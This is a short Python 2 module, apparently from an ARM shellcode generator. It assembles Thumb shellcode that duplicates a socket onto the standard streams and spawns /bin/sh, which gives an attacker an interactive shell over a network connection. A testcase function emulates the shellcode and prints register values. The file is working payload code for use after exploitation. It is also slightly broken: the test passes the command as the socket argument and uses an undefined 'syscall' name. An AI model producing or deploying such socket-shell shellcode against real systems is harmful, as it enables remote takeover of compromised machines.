import dup
import sh

def generate(sock=4, cmd='/bin/sh'):
    """Duplicates sock to stdin, stdout and stderr and spawns a shell

    Args:
        sock(int/str/reg): sock descriptor

        cmd(str): executes a cmd (default: /bin/sh)

    """
    sc = dup.generate(sock)
    sc += sh.generate(cmd)
    return sc

def testcase(sock=4, cmd='/bin/sh'):
    import ARMSCGen as scgen
    scgen.prepareCompiler('THUMB')
    sc = scgen.CompileSC(generate(cmd), isThumb=True)
    mu = scgen.UC_TESTSC(sc, len(sc) - len(cmd), 11, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
    if mu == -1:
        print "There is no emulator instance"
        return -1

    r0 = mu.reg_read(scgen.UC_ARM_REG_R0)
    r1 = mu.reg_read(scgen.UC_ARM_REG_R1)
    r2 = mu.reg_read(scgen.UC_ARM_REG_R2)
    r7 = mu.reg_read(scgen.UC_ARM_REG_R7)

    print "[+] Register information"
    print "r0: 0x%08x - cmd: %s" % (r0, sc[r0:r0+len(cmd)])
    print "r1: 0x%08x - Stack pointer" % (r1)
    print "r2: 0x%08x - Null" % (r2)
    print "r7: 0x%08x - System call: %s" % (r7, syscall.get(r7))
